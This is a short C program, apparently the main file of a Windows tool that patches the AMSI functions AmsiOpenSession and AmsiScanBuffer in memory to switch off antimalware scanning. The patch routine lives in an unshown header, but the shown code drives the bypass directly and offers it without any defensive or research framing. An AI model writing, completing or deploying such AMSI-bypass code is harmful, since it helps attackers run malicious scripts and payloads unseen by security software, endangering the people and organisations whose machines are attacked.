#include "Box.h"

int main()
{

	if (!PatchAmsi("AmsiOpenSession"))
	{
		PRINT_ERROR("PatchAmsi");
		return 1;
	}

	if (!PatchAmsi("AmsiScanBuffer"))
	{
		PRINT_ERROR("PatchAmsi");
		return 1;
	}

	printf("Press Enter to Quit...\n");
	getchar();

	return 0;

}